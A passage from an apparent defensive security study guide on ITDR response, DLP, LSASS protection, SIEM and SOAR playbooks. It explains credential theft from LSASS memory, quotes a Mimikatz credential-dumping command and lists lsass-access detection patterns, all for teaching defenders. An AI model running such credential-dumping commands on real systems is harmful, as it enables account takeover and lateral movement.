  │    • Isolate additional hosts if found                   │
  │    • Change password for krbtgt account (TWICE!)        │
  │    • Reset all potentially compromised account passwords │
  │                                                          │
  │  Phase 2 — Eradicate (hours):                            │
  │    • Find initial access vector (how did attacker get in)│
  │    • Identify all persistence mechanisms                 │
  │    • Remove rogue accounts, backdoor GPOs, scheduled     │
  │      tasks, DCShadow registrations                       │
  │    • Check for AD object permission backdoors            │
  │    • Scan AD for AdminSDHolder abuse                     │
  │                                                          │
  │  Phase 3 — Recover (days):                               │
  │    • Restore clean AD state from known-good backup       │
  │    • Re-enable accounts after password reset             │
  │    • Rebuild/reimage compromised endpoints               │
  │    • Verify Kerberos health (check for extra DCs)        │
  │                                                          │
  │  Phase 4 — Harden (post-incident):                       │
  │    • Enable Protected Users security group for DA accts  │
  │    • Deploy LAPS (Local Admin Password Solution)         │
  │    • Implement Privileged Access Workstations (PAWs)     │
  │    • Enable ATA/MDI honeypot accounts                    │
  │    • Review and tighten ACLs on all AD objects           │
  └──────────────────────────────────────────────────────────┘
```

### ITDR Response Actions — Full Catalogue:

```
RESPONSE ACTION         WHAT IT DOES                        WHEN USED
─────────────────────────────────────────────────────────────────────────────
DISABLE ACCOUNT         Set AD userAccountControl = DISABLED  Compromised account
                        User cannot log in anywhere           confirmed

FORCE PASSWORD RESET    ITDR/SOAR triggers password reset     Credential theft
                        User must change on next login        suspected

SESSION REVOCATION      Azure AD: Revoke all refresh tokens   Cloud account
                        On-prem: Force logoff active sessions compromise

MFA ENFORCEMENT         Force MFA challenge on next login     Suspicious login
                        Even for trusted devices              from new location

ACCOUNT QUARANTINE      Move user to restricted OU            Suspected insider
                        Apply restrictive GPO (read-only)     threat

PRIVILEGE REMOVAL       Remove from privileged groups         Privilege
                        (Domain Admins, Enterprise Admins)    escalation detected

HOST ISOLATION          Via EDR API → network isolate         Attacker using
                        the source machine                    specific machine

TICKET INVALIDATION     Initiate krbtgt password reset (x2)  Golden Ticket
                        Invalidates ALL existing Kerberos TGTs detected

ROGUE DC REMOVAL        Remove DCShadow rogue DC registration DCShadow attack
                        from AD Sites & Services              detected

ALERT + ESCALATE        Page SOC/IR team                      High/Critical
                        Create P1 incident ticket             severity alert

FORENSIC CAPTURE        Trigger memory/disk capture on host   For post-incident
                        via EDR integration                   forensic analysis

THREAT INTEL PUSH       Push IOCs (IPs, accounts, hashes)     Wider campaign
                        to all security controls              suspected
```

### ITDR Response Playbook — Step-by-Step Example: Password Spray Attack

```
SCENARIO: Attacker performs password spray against 500 domain accounts.
          200 failed, 3 succeeded.

DETECTION (Automatic — 0 seconds):
  ITDR sees: 200 failed logins (Event 4625) from 10.0.50.99
  in 90 seconds across 200 different usernames
  Pattern: same password tried against many accounts = SPRAY
  Alert: "Password Spray Attack — Source: 10.0.50.99"

ENRICHMENT (Automatic — 5 seconds):
  ITDR checks: Which accounts had SUCCESSFUL logins from 10.0.50.99?
  Answer: jbrown, swilliams, hlee — all in Finance department
  Further: Are any of these privileged? YES — hlee is in Domain Admins!
  Risk: CRITICAL

AUTOMATED RESPONSE (Automatic — 10 seconds):
  Step 1: Lock source IP 10.0.50.99 at firewall (SOAR API call)
  Step 2: Force MFA re-challenge for jbrown, swilliams, hlee
  Step 3: Disable hlee account (Domain Admin — extreme risk)
  Step 4: Revoke all active sessions for the 3 accounts
  Step 5: Create P1 incident ticket with full evidence

ANALYST RESPONSE (Human — within 5 minutes):
  Question 1: Is 10.0.50.99 internal or external?
    → Internal IP! Attacker is already inside the network.
    → CRITICAL escalation — initial breach already happened.
  
  Question 2: What did jbrown/swilliams/hlee do after login?
    → ITDR timeline shows: hlee ran PowerShell, accessed 3 file servers
    → EDR shows: PowerShell downloaded a file from internal share
  
  Action: Isolate hlee's workstation via EDR.
          Examine downloaded file (malware? tool?).
          Full IR begins — scope entire compromise.

LESSON: ITDR's response stopped active credential abuse within 10 seconds.
        Without it, hlee (Domain Admin) would have silently compromised
        the entire AD environment. Average detection without ITDR: 204 days.
```

### How ITDR Integrates with the Full Security Stack:

```
ITDR INTEGRATION MAP:

         ┌─────────────────┐
         │   SIEM          │ ← Receives all ITDR alerts as logs
         │  (Splunk/Sentinel│   ITDR enriches SIEM with identity context
         └────────┬────────┘
                  │
         ┌────────▼────────┐
         │   SOAR          │ ← Receives ITDR alerts → runs playbooks
         │  (Palo Cortex/  │   SOAR tells ITDR what response to take
         │   Splunk SOAR)  │
         └────────┬────────┘
                  │
    ┌─────────────┼───────────────────┐
    │             │                   │
    ▼             ▼                   ▼
┌───────┐   ┌─────────┐         ┌──────────────┐
│  EDR  │   │Firewall/│         │  Active       │
│(Crowd │   │  NGFW   │         │  Directory   │
│Strike)│   │         │         │  / Azure AD  │
└───────┘   └─────────┘         └──────────────┘
  Isolate     Block IP            Disable account
  host        at perimeter        Reset password
              Lock source         Revoke sessions
```

### ITDR Products:

| Product | Vendor | Focus |
|---------|--------|-------|
| **Microsoft Defender for Identity** | Microsoft | On-prem AD protection |
| **CrowdStrike Identity Protection** | CrowdStrike | Hybrid AD protection |
| **SentinelOne Singularity Identity** | SentinelOne | AD + Cloud identity |
| **Silverfort** | Silverfort | Agentless identity protection |
| **Semperis** | Semperis | AD-specific protection + recovery |
| **Vectra AI** | Vectra | Identity-based threat detection |

---

## 8.9 DLP — Data Loss Prevention

### What is DLP?

DLP is a set of **tools and processes that detect and prevent unauthorized transfer, use, or disclosure of sensitive data** — both by malicious insiders and by accidental data leakage.

```
DLP PROTECTS DATA IN THREE STATES:

DATA IN USE:
  • Data actively being used on endpoints
  • DLP monitors: clipboard, screenshots, printing, USB copy
  • Example: Blocks copying sensitive data to USB drive

DATA IN MOTION:
  • Data being transmitted over networks
  • DLP monitors: Email, web uploads, FTP, cloud sync
  • Example: Blocks sending credit card numbers via email

DATA AT REST:
  • Data stored on systems (files, databases)
  • DLP scans: Network shares, endpoints, cloud storage
  • Example: Finds Social Security Numbers stored in unencrypted spreadsheets
```

### How DLP Works:

```
DLP DETECTION METHODS:

1. KEYWORD MATCHING:
   "Top Secret", "Confidential", "Patient Name", "SSN"
   Simple but generates many false positives

2. REGULAR EXPRESSIONS (REGEX):
   Pattern: \b\d{3}-\d{2}-\d{4}\b → Detects SSN format
   Pattern: \b4[0-9]{12}(?:[0-9]{3})?\b → Detects Visa card
   
3. FINGERPRINTING:
   Create a fingerprint of a sensitive document
   Detect when portions of that document are transmitted
   Even if copied, reformatted, or partially redacted

4. ML CLASSIFICATION:
   Train ML model on examples of sensitive vs non-sensitive data
   Model classifies new content automatically
   More accurate, less false positives

5. CONTEXT ANALYSIS:
   Not just WHAT data, but HOW it's being used
   "Sending customer list to personal email = suspicious"
   "CFO sending financial data to auditor = OK"
```

### DLP Architecture:

```
DLP COMPONENTS:

┌─────────────────────────────────────────────────────────┐
│                   DLP PLATFORM                          │
│                                                         │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
│  │  Network DLP │  │ Endpoint DLP │  │ Storage DLP  │  │
│  │              │  │              │  │              │  │
│  │ • Email DLP  │  │ • Agent on   │  │ • Scans file │  │
│  │ • Web DLP    │  │   endpoint   │  │   servers    │  │
│  │ • Cloud DLP  │  │ • Controls   │  │ • Scans DBs  │  │
│  │ • SSL inspect│  │   USB, print │  │ • Scans cloud│  │
│  └──────────────┘  └──────────────┘  └──────────────┘  │
│                                                         │
│  POLICY ENGINE: "If SSN detected in email to external   │
│                  domain → Block and alert security"     │
└─────────────────────────────────────────────────────────┘
```

### DLP Policy Actions:

```
On detecting a policy violation, DLP can:
  BLOCK:   Prevent the action entirely (user cannot send the email)
  ALERT:   Allow but notify security team
  QUARANTINE: Hold for manual review
  ENCRYPT: Automatically encrypt the data before transmission
  NOTIFY:  Show user a warning (coaching opportunity)
  LOG:     Record for audit purposes without blocking
  WATERMARK: Add tracking to the document
```

---

## 8.10 LSASS — Local Security Authority Subsystem Service

### What is LSASS?

LSASS (`lsass.exe`) is a **critical Windows process** responsible for authentication, security policy enforcement, and managing credential storage. It is the single most targeted process in Windows attacks because it holds credential material in memory.

```
LSASS FUNCTIONS:
┌──────────────────────────────────────────────────────────┐
│                   lsass.exe                              │
│                                                          │
│  AUTHENTICATION:              CREDENTIAL STORAGE:        │
│  • Validates passwords        • NT Hashes (NTLM)         │
│  • Issues Kerberos tickets    • Kerberos TGTs            │
│  • Handles NTLM challenges    • WDigest (cleartext*)     │
│  • Smart card authentication  • DPAPI master keys        │
│                               • Cached domain credentials│
│  POLICY:                                                 │
│  • Enforces password policies  AUDIT:                    │
│  • Manages account lockout    • Generates security events│
│  • Controls logon rights      • Event 4624 (logon)       │
│                               • Event 4625 (failed logon)│
└──────────────────────────────────────────────────────────┘
* WDigest cleartext disabled by default in Win 8.1+
```

### Why Attackers Target LSASS:

```
CREDENTIAL MATERIAL IN LSASS MEMORY:

When you log into Windows:
  1. Your password → NTLM hash → stored in LSASS (for future NTLM auth)
  2. Your credentials → Kerberos TGT → stored in LSASS (for SSO)
  3. If WDigest enabled → cleartext password also stored in LSASS

Attacker with access to lsass.exe memory can:
  • Extract NT hashes → Pass-the-Hash → move laterally
  • Extract Kerberos tickets → Pass-the-Ticket → impersonate users
  • Extract cleartext passwords → Direct account compromise
  • Extract DPAPI keys → Decrypt encrypted secrets (browser passwords, etc.)

This is why Mimikatz targets LSASS:
  sekurlsa::logonpasswords
  → Dumps all credentials from LSASS memory
```

### LSASS Protection:

```
PROTECTION 1: RunAsPPL (Protected Process Light)
  Registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa → RunAsPPL = 1
  
  Effect: Even SeDebugPrivilege cannot open LSASS
  Bypass: Requires kernel driver (BYOVD technique)

PROTECTION 2: Credential Guard (Windows 10 Enterprise+)
  Uses Hyper-V to run isolated LSASS in separate virtual trust level
  Credential material stored in "LSAIso.exe" in VTL1
  VTL0 (normal kernel) CANNOT access VTL1 memory
  Mimikatz sees only empty credential containers

PROTECTION 3: Windows Defender Credential Guard in Azure VMs
  Full Credential Guard in cloud VMs
  
DEFENSE IN DEPTH for LSASS:
  1. Enable RunAsPPL
  2. Enable Credential Guard
  3. Disable WDigest (already off by default Win8.1+)
  4. Limit members of local Administrators group
  5. Monitor for: lsass.exe memory access, minidump creation events
  6. Alert on: procdump.exe, taskmgr.exe accessing lsass.exe
```

### LSASS Monitoring Events:

```
CRITICAL WINDOWS EVENT IDs RELATED TO LSASS:

4624  — Successful logon
4625  — Failed logon (password spray/brute force detection)
4627  — Group membership information (at logon — shows what groups user is in)
4634  — Account logged off
4648  — Logon attempt with explicit credentials (RunAs, lateral movement)
4672  — Special privileges assigned (SeDebugPrivilege = possible dumping)
4776  — NTLM authentication attempt (on DC)
4768  — Kerberos TGT requested
4769  — Kerberos Service Ticket requested (Kerberoasting: look for RC4)
4770  — Kerberos ticket renewed
10    (Sysmon) — Process access (lsass.exe accessed by another process)
```

---

## 8.11 SIEM — Security Information and Event Management

### What is SIEM?

SIEM is a platform that **collects, normalizes, correlates, and analyzes log data from across the entire IT environment** to detect security threats, support incident investigation, and meet compliance requirements.

**Beginner analogy:** Imagine your entire organization is a city, and every building (server, firewall, laptop, cloud app) writes a diary entry for everything it does. SIEM is the master librarian that collects ALL those diaries, reads them, cross-references them, and says "Wait — three different buildings reported seeing the same suspicious stranger at the same time. Something is wrong." It does NOT physically stop the stranger — that is SOAR's job. SIEM's job is to **see, collect, correlate, and alert**.

```
SIEM = SIM + SEM

SIM (Security Information Management):
  • Log collection and storage
  • Long-term retention (compliance: 1–7 years)
  • Historical search and forensic investigation
  • Compliance reporting (PCI-DSS, HIPAA, SOX audit trails)

SEM (Security Event Management):
  • Real-time event correlation
  • Alerting on suspicious patterns
  • Incident detection (rules + ML)
  • Dashboard and visualization

SIEM combines both into one platform.
```

### What SIEM Actually Looks Like — A Real Analyst's View:

```
SIEM ANALYST CONSOLE (e.g., Splunk / Microsoft Sentinel):

┌──────────────────────────────────────────────────────────────────┐
│  ALERT QUEUE                              [Splunk ES Dashboard]  │
│  ─────────────────────────────────────────────────────────────── │
│  [CRITICAL] Golden Ticket Detected           HOST-FIN-01  🔴   │
│  [HIGH]     New Domain Admin Added           jsmith        🟠   │
│  [HIGH]     Brute Force: 400 failures in 60s 185.220.101.5 🟠   │
│  [MEDIUM]   Impossible Travel Detected       hlee          🟡   │
│  [LOW]      USB Device Connected             MKTG-LAPTOP-3 🟢   │
│  ─────────────────────────────────────────────────────────────── │
│  SEARCH:  index=windows EventCode=4625 | stats count by src_ip  │
│  ─────────────────────────────────────────────────────────────── │
│  DASHBOARDS:   Threat Overview | Compliance | Threat Hunt       │
└──────────────────────────────────────────────────────────────────┘

What the analyst can do in SIEM:
  1. Click an alert → see ALL raw log events that triggered it
  2. Search: "Show me everything user jsmith did in last 24 hours"
  3. Timeline view: "What happened on HOST-FIN-01 between 3am-4am?"
  4. Pivot: "Any other hosts communicated with this C2 IP?"
  5. Export: Full forensic report for incident documentation
```

### How SIEM Ingests Data — Technical Detail:

```
DATA INGESTION METHODS:

1. AGENT-BASED (most common for endpoints):
   • SIEM agent installed on each source (e.g., Splunk Universal Forwarder)
   • Agent reads local log files, Windows Event Log API, ETW
   • Agent compresses and forwards logs to SIEM indexer
   • Agent can do local filtering (reduce noise before sending)
   Example: Splunk UF on every Windows server → sends Security.evtx logs

2. SYSLOG (most common for network devices):
   • Network standard for log shipping (UDP 514 / TCP 6514 TLS)
   • Firewalls, switches, routers, VPN → syslog → SIEM
   • Lightweight, no agent needed on the device
   Example: Palo Alto firewall syslog → SIEM's syslog listener

3. API INTEGRATION (cloud platforms):
   • Cloud platforms expose REST APIs for log retrieval
   • SIEM polls API periodically OR webhooks push in real-time
   Example: Microsoft 365 → Office 365 Management API → Microsoft Sentinel
            AWS CloudTrail → S3 bucket → Splunk S3 input

4. DATABASE QUERY:
   • SIEM queries databases directly for audit tables
   • Used for: Oracle DB audit logs, custom app databases

5. NETFLOW / IPFIX:
   • Network devices export flow records (not full packets)
   • SIEM gets: who talked to whom, how much, when
   • Supplements packet-level data from sensors

NORMALIZATION:
  Raw log (Cisco ASA firewall):
    %ASA-6-302013: Built outbound TCP connection 12345 for outside:45.33.32.156/443
    (192.168.1.50/49234) to inside:192.168.1.50/49234

  After SIEM normalization (Common Information Model):
    {
      "timestamp": "2024-01-15T03:42:17Z",
      "src_ip": "192.168.1.50",
      "dst_ip": "45.33.32.156",
      "dst_port": 443,
      "action": "allowed",
      "device": "cisco-asa-01",
      "event_type": "network_connection"
    }
  
  Now this field maps identically to a Windows firewall log or
  AWS VPC flow log → they can be CORRELATED.
```

### SIEM Data Flow:

```
LOG SOURCES → SIEM PIPELINE:

┌─────────────────────────────────────────────────────────────────┐
│ LOG SOURCES                                                     │
│ Firewalls, IDS, Windows Event Logs, Linux Syslog, AD, AV,     │
│ VPN, Cloud (AWS CloudTrail, Azure Monitor), Applications...     │
└──────────────────────────┬──────────────────────────────────────┘
                           │ millions of events per second
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│ COLLECTION / INGESTION                                          │
│ • Agents (installed on sources)                                │
│ • Syslog server (network-based log shipping)                   │
│ • API integrations (cloud platforms)                            │
│ • Log forwarders (Filebeat, Fluentd, NXLog)                    │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│ PARSING / NORMALIZATION                                         │
│ • Extract structured fields from unstructured logs             │
│ • Map to common schema (timestamp, source IP, user, action)    │
│ • Enrich with threat intel (known bad IPs, domains, hashes)    │
│ • Enrich with asset context (this IP = Finance server)         │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│ STORAGE                                                         │
│ • Short-term hot storage (searchable, recent events)           │
│ • Long-term cold storage (compliance retention — 1-7 years)    │
│ • Indexed for fast search                                      │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│ CORRELATION ENGINE                                              │
│ • Apply rules: "5 failed logins within 5 minutes from same IP" │
│ • Statistical analysis: "This user logs in at 3am for first    │
│   time in 2 years — anomalous"                                 │
│ • ML models: unsupervised clustering of unusual behaviors      │
│ • MITRE ATT&CK mapping of detected techniques                  │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│ ALERTING / DASHBOARDS / REPORTING                               │
│ • Priority-ordered alert queue for SOC analysts                │
│ • Real-time dashboards (geographic attack maps, etc.)          │
│ • Compliance reports (PCI-DSS report, SOX audit trail)         │
│ • Forensic search interface (find all activity by user/IP)     │
└─────────────────────────────────────────────────────────────────┘
```

### SIEM Use Cases:

```
USE CASE 1: Brute Force Detection
  Rule: "More than 5 failed logins (Event 4625) from same IP in 2 minutes"
  Action: Alert SOC + Auto-block IP at firewall via SOAR integration

USE CASE 2: Privilege Escalation Detection
  Rule: "User added to Domain Admins group (Event 4728) by non-IT user"
  Action: CRITICAL alert + page on-call security team

USE CASE 3: After-Hours Access
  Rule: "VPN login at 3am for user who has never logged in after 8pm"
  Action: Alert SOC for review, possibly trigger MFA re-challenge

USE CASE 4: Lateral Movement
  Rule: "Same source IP authenticates to 20+ internal hosts within 10 minutes"
  Action: CRITICAL alert — possible ransomware spreading

USE CASE 5: Data Exfiltration
  Rule: "Server sent >10GB outbound in 1 hour (normal baseline: <500MB)"
  Action: HIGH alert — investigate C2 or insider threat
```

### SIEM Products:

| Product | Vendor | Deployment |
|---------|--------|------------|
| **Splunk Enterprise Security** | Splunk | On-prem/Cloud — Market leader |
| **Microsoft Sentinel** | Microsoft | Cloud-native (Azure) |
| **IBM QRadar** | IBM | On-prem/Cloud |
| **Exabeam** | Exabeam | Cloud — UEBA focused |
| **LogRhythm** | LogRhythm | On-prem — compliance focused |
| **Elastic SIEM** | Elastic | Open-source based |
| **ArcSight** | Micro Focus | On-prem — enterprise |
| **AlienVault OSSIM** | AT&T | Open-source, SMB focused |

---

## 8.12 SOAR — Security Orchestration, Automation, and Response

### What is SOAR?

SOAR platforms enable **automated, orchestrated response to security alerts** by connecting security tools together and automating repetitive analyst tasks through predefined playbooks.

**Beginner analogy:** Think of SOAR as the fire brigade. The smoke detector (SIEM) sees smoke and raises an alarm. SOAR is the fire brigade that automatically kicks into action — it calls other units (EDR, firewall, AD), follows a strict procedure (playbook), extinguishes the fire (blocks the threat), and only calls the fire chief (analyst) when the situation needs a human decision. Without SOAR, the chief would have to manually call every unit themselves — by the time they finish, the building is gone.

```
SOAR = Orchestration + Automation + Response

Orchestration:  Connect ALL security tools together via APIs
                  SIEM, EDR, Firewall, Threat Intel feeds,
                  AD/IAM, Ticketing systems (Jira/ServiceNow),
                  Communication tools (Slack/PagerDuty/Email)

Automation:     Execute repetitive tasks without human touch
                  Extract IOCs → Check threat intel → Block → Notify
                  These happen in seconds, 24/7, even at 3am

Response:       Take real enforcement actions on threats
                  Block IP at firewall, isolate endpoint via EDR,
                  disable user account in AD, revoke cloud sessions
```

### What SOAR Looks Like — Inside the Platform:

```
SOAR PLATFORM INTERFACE (e.g., Palo Alto XSOAR / Splunk SOAR):

┌─────────────────────────────────────────────────────────────────┐
│  INCIDENT QUEUE                                [Cortex XSOAR]  │
│  ──────────────────────────────────────────────────────────── │
│  #1042 [CRITICAL] Golden Ticket — HOST-FIN-01    AUTO: 5/7 ✅ │
│  #1041 [HIGH]     Phishing Campaign — 12 users   AUTO: 7/7 ✅ │
│  #1040 [HIGH]     Ransomware Behavior on WS-04   HUMAN NEEDED │
│  #1039 [MEDIUM]   Brute Force (blocked)          AUTO CLOSED  │
│  ──────────────────────────────────────────────────────────── │
│                                                               │
│  PLAYBOOK CANVAS (drag-and-drop visual workflow):             │
│                                                               │
│  [Trigger: SIEM Alert]                                        │
│       │                                                       │
│  [Extract IOCs] ──► [Check VirusTotal] ──► [Malicious?]      │
│                                                │              │
│                                           [YES]  [NO]         │
│                                            │      │           │
│                                     [Block IP] [Close Ticket] │
│                                            │                  │
│                                     [Check other victims]     │
│                                            │                  │
│                                     [Isolate endpoints]       │
│                                            │                  │
│                                     [Notify Analyst]          │
│                                                               │
│  INTEGRATIONS:  SIEM  EDR  Firewall  ThreatIntel  AD  Slack  │
└─────────────────────────────────────────────────────────────────┘
```

### What is a Playbook? — Deep Dive

A **playbook** is the heart of SOAR. It is a **predefined, step-by-step automated workflow** that tells SOAR exactly what to do when a specific type of incident occurs. Think of it as a recipe — when the kitchen detects smoke, the recipe says: first check the oven, then call the fire brigade, then evacuate the building. No improvisation, no delay.

```
PLAYBOOK ANATOMY:

┌───────────────────────────────────────────────────────────────┐
│                        PLAYBOOK                               │
│                                                               │
│  NAME:      "Phishing Email Response v2.1"                    │
│  TRIGGER:   Alert type = "Phishing" OR user reports email     │
│  SEVERITY:  Runs on Medium, High, Critical                    │
│  SLA:       Must complete automated phases within 5 minutes   │
│                                                               │
│  TASKS:                                                       │
│  ┌──────────────────────────────────────────────────────┐    │
│  │  Task 1: Parse Email (Automated)                     │    │
│  │    Input:  Raw email (.eml file or message ID)       │    │
│  │    Action: Extract headers, body, attachments        │    │
│  │    Output: {sender, subject, URLs[], hashes[]}       │    │
│  └───────────────────────┬──────────────────────────────┘    │
│                          │                                    │
│  ┌───────────────────────▼──────────────────────────────┐    │
│  │  Task 2: Threat Intelligence Lookup (Automated)      │    │
│  │    Input:  URLs[], IPs[], hashes[]                   │    │
│  │    Action: Query VirusTotal API, Talos, URLhaus       │    │
│  │    Output: {malicious: true/false, confidence: 95%}  │    │
│  └───────────────────────┬──────────────────────────────┘    │
│                 ┌────────┴────────┐                           │
│                 │                 │                           │
│  ┌──────────────▼──┐   ┌──────────▼──────────────────────┐  │
│  │ Task 3a: CLEAN  │   │ Task 3b: MALICIOUS              │  │
│  │ Close ticket    │   │ → Block URL in proxy            │  │
│  │ Log as FP       │   │ → Block sender domain in email  │  │
│  └─────────────────┘   │ → Block IP in firewall          │  │
│                        │ → Search for other recipients   │  │
│                        └──────────┬─────────────────────-┘  │
│                                   │                          │
│                        ┌──────────▼──────────────────────┐  │
│                        │ Task 4: Victim Scope (Auto)      │  │
│                        │ Query SIEM: who got this email?  │  │
│                        │ Query EDR: who opened attachment?│  │
│                        └──────────┬──────────────────────-┘  │
│                                   │                          │
│                        ┌──────────▼──────────────────────┐  │
│                        │ Task 5: Containment (Auto)       │  │
│                        │ • Isolate infected endpoints     │  │
│                        │ • Disable compromised accounts   │  │
│                        └──────────┬──────────────────────-┘  │
│                                   │                          │
│                        ┌──────────▼──────────────────────┐  │
│                        │ Task 6: Human Decision Point     │  │
│                        │ ⚠️  REQUIRES ANALYST APPROVAL   │  │
│                        │ "Wipe and reimage endpoints?"    │  │
│                        │ [APPROVE] / [DENY] / [DEFER]     │  │
│                        └─────────────────────────────────-┘  │
└───────────────────────────────────────────────────────────────┘
```

### Playbook Types — Full Catalogue:

| Playbook Type | Trigger | Key Actions | Automation Level |
|---------------|---------|-------------|------------------|
| **Phishing Response** | Reported phishing email | Extract IOCs, block, scope, isolate | 80% automated |
| **Malware/Ransomware** | EDR detection of malware | Isolate endpoint, snapshot disk, collect forensics | 60% automated |
| **Brute Force** | 5+ failed logins | Block IP, notify user, flag account, check success | 90% automated |
| **Privilege Escalation** | New Domain Admin added | Alert IR, verify if authorized, revert if not | 40% automated |
| **Data Exfiltration** | >Xgb outbound transfer | Block egress, capture PCAP, trace source process | 50% automated |
| **Vulnerability Alert** | Critical CVE scan hit | Assess exposure, create patch ticket, notify owner | 70% automated |
| **Insider Threat** | DLP + anomalous behavior | Covert monitoring mode, silent ticket, HR notify | 30% automated |
| **Cloud Compromise** | Impossible travel / new API key | Revoke token, MFA force, alert user, cloud IR | 85% automated |
| **Identity Attack (ITDR)** | Golden Ticket / Kerberoasting | Disable account, krbtgt reset prep, isolate host | 70% automated |

### SOAR Playbook — Full Example: Phishing Email Response

```
PLAYBOOK: "Phishing Email Response"

TRIGGER: SIEM Alert — "Phishing Email Reported"
  (User clicked "Report Phishing" button in Outlook)
              │
              ▼ [AUTOMATED — 0:00]
TASK 1: EMAIL PARSING
  SOAR calls Microsoft 365 API → retrieves full email
  Extracts:
    sender_email   = "support@micros0ft-verify.com"
    sender_ip      = "185.220.101.5"
    subject        = "Your account will be suspended"
    urls_in_body   = ["http://evil-login.com/verify"]
    attachments    = ["Invoice_Feb2024.docx.exe"]
    attachment_hash = "4a3b9f2c..."
              │
              ▼ [AUTOMATED — 0:00:05]
TASK 2: THREAT INTELLIGENCE ENRICHMENT
  API call → VirusTotal:
    URL "evil-login.com":      49/90 engines = MALICIOUS ✅
    Hash "4a3b9f2c...":        67/90 engines = MALICIOUS ✅
    IP "185.220.101.5":        Known TOR exit node = MALICIOUS ✅
  
  Confidence: MALICIOUS (HIGH)
              │
              ▼ [AUTOMATED — 0:00:12]
TASK 3: IMMEDIATE CONTAINMENT
  API → Palo Alto firewall:     Block IP 185.220.101.5 ✅
  API → Proofpoint email GW:    Block domain micros0ft-verify.com ✅
  API → Zscaler web proxy:      Block URL evil-login.com ✅
  API → SIEM search:            "Who else received this email today?" 
    → Result: 47 users received it
              │
              ▼ [AUTOMATED — 0:00:25]
TASK 4: VICTIM SCOPING
  API → Microsoft 365: "Did any of 47 users open the attachment?"
    → 12 users opened attachment (email tracking confirms)
  API → CrowdStrike EDR: "Did any of 12 endpoints execute attachment?"
    → 3 endpoints executed: LAPTOP-FIN-01, LAPTOP-HR-04, WS-SALES-09
              │
              ▼ [AUTOMATED — 0:00:40]
TASK 5: ENDPOINT CONTAINMENT
  API → CrowdStrike: Network-isolate LAPTOP-FIN-01 ✅
  API → CrowdStrike: Network-isolate LAPTOP-HR-04 ✅
  API → CrowdStrike: Network-isolate WS-SALES-09 ✅
  API → Active Directory: Disable accounts of 3 users ✅
  API → ServiceNow: Create P1 incident #INC0042847 ✅
  API → PagerDuty: Page on-call IR analyst ✅
  API → Slack #security-incidents: Post alert with full summary ✅
              │
              ▼ [AUTOMATED — 0:01:00]
TASK 6: NOTIFICATION TO ALL RECIPIENTS
  API → Microsoft 365: Retract email from mailboxes of 44 clean users ✅
  API → Email: Notify 44 users "Phishing email retracted — no action needed" ✅
              │
              ▼ [HUMAN HANDOFF — 0:01:05]
TASK 7: ANALYST REVIEW
  Analyst receives PagerDuty page with:
    • Full timeline of automated actions taken
    • 3 isolated endpoints + 3 disabled accounts
    • IOC list already blocked at all controls
    • SIEM search links pre-built for deep investigation
    • EDR process trees for all 3 infected endpoints
  
  Analyst decision points:
    • Confirm endpoint isolation (or release if false positive)
    • Approve full disk forensic image of 3 endpoints
    • Determine if compromise scope is wider
    • Decide if password reset for ALL 47 recipients is needed

TOTAL AUTOMATED TIME: ~1 minute
ANALYST TIME SAVED: ~55 minutes of manual work
```

### SOAR Benefits — With Real Numbers:

```
WITHOUT SOAR:
  Analyst receives phishing alert (3am)
  → Wakes up, logs in                              5 min
  → Manually extracts IOCs from email              10 min
  → Manually checks VirusTotal (one by one)        15 min
  → Manually blocks in firewall (ticket + wait)    5 min
  → Manually searches SIEM for other victims       20 min
  → Manually queries EDR per endpoint              15 min
  → Manually isolates infected machines            10 min
  → Manually creates incident ticket               5 min
  → Manually notifies manager + team               5 min
  TOTAL: ~90 minutes, one analyst fully consumed
  Attacker dwell time during manual process: 90+ minutes

WITH SOAR:
  Alert received → Playbook starts automatically
  All above steps complete in: 60 seconds
  Analyst wakes up to a FULLY DOCUMENTED incident
  with all containment already done.
  Analyst makes high-level decisions only: 10 min
  TOTAL: ~11 minutes end-to-end
  Attacker dwell time: 60 seconds
  
SOC CAPACITY IMPACT:
  Without SOAR: 1 analyst handles ~5 incidents/shift
  With SOAR:   1 analyst handles ~50 incidents/shift
  ROI: 10x analyst capacity — no extra headcount needed
```

### SIEM + SOAR Integration — How They Work Together:

```
THE FULL SIEM → SOAR → RESPONSE CHAIN:

Step 1: LOG SOURCES send data to SIEM
  Firewall, EDR, AD, VPN, Cloud → logs → SIEM

Step 2: SIEM CORRELATES and DETECTS
  Correlation rule fires: "5 failed logins + 1 success in 60 sec"
  Alert created: Severity=HIGH, type="Brute Force Success"

Step 3: SIEM SENDS ALERT TO SOAR
  Method: Webhook / REST API / native integration
  SOAR receives: Alert details + raw log context

Step 4: SOAR IDENTIFIES MATCHING PLAYBOOK
  Alert type = "Brute Force" → Load playbook "Brute Force Response"
  Incident ticket auto-created in SOAR case management

Step 5: SOAR ORCHESTRATES RESPONSE
  ┌───────────────────────────────────────────────┐
  │                  SOAR                         │
  │                                               │
  │  ┌───────────┐  ┌──────────┐  ┌────────────┐ │
  │  │ SIEM API  │  │ EDR API  │  │  AD API    │ │
  │  │ (search   │  │ (isolate │  │  (disable  │ │
  │  │ logs)     │  │ endpoint)│  │  account)  │ │
  │  └───────────┘  └──────────┘  └────────────┘ │
  │                                               │
  │  ┌───────────┐  ┌──────────┐  ┌────────────┐ │
  │  │ Firewall  │  │ ThreatIn │  │  Ticketing │ │
  │  │ (block IP)│  │ (enrich) │  │  (Jira/SN) │ │
  │  └───────────┘  └──────────┘  └────────────┘ │
  └───────────────────────────────────────────────┘

Step 6: HUMAN ANALYST GETS COMPLETE PICTURE
  Analyst console shows:
  • What was detected (SIEM alert context)
  • What was done automatically (SOAR actions log)
  • Current state of incident (isolated? contained?)
  • What decisions still need a human
```

### SIEM vs SOAR — Master Comparison Table

This is the most critical distinction to understand. They work TOGETHER but do completely different jobs:

```
┌─────────────────────┬──────────────────────────┬──────────────────────────┐
│ DIMENSION           │ SIEM                      │ SOAR                     │
├─────────────────────┼──────────────────────────┼──────────────────────────┤
│ PRIMARY JOB         │ SEE and ALERT             │ ACT and RESPOND          │
│                     │ Collect, correlate, detect│ Automate, orchestrate    │
